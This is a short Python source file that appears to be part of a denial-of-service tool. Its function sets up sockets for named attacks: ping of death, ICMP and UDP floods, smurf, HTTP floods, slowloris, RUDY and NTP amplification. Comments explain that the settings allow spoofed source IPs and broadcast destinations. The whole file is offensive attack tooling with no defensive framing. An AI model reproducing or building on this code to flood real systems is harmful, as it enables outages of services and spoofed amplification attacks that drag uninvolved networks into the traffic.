# external libs
from socket import socket, IPPROTO_UDP, AF_INET, SOCK_RAW, IPPROTO_ICMP, IPPROTO_IP, IP_HDRINCL, SOL_SOCKET, SO_BROADCAST, SOCK_STREAM, SOCK_DGRAM, error
from sys import exit


def create_socket(attackname):
    """Create socket for specified attack"""
    try:
        sock = None
        match attackname:
            case "pingofdeath":
                sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)
            case "icmpflood":
                sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)
                sock.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)  # allow modifying source IP
            case "smurf":
                sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)
                sock.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)  # allow modifying source IP
                sock.setsockopt(SOL_SOCKET, SO_BROADCAST, 1)  # allow broadcast IP as a destination
            case ("httpgetflood" | "httppostflood" | "httpheadflood"):
                sock = socket(AF_INET, SOCK_STREAM)
            case ("slowloris" | "rudy"):
                sock = socket(AF_INET, SOCK_STREAM)
                sock.settimeout(4)
            case "ntpampl":
                sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)
                sock.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)  # allow modifying source IP
            case "udpflood":
                sock = socket(AF_INET, SOCK_DGRAM)
        return sock

    except error as err:
        print("For attack " + attackname + " was caught exception socket.error: ", err)
        exit(1)
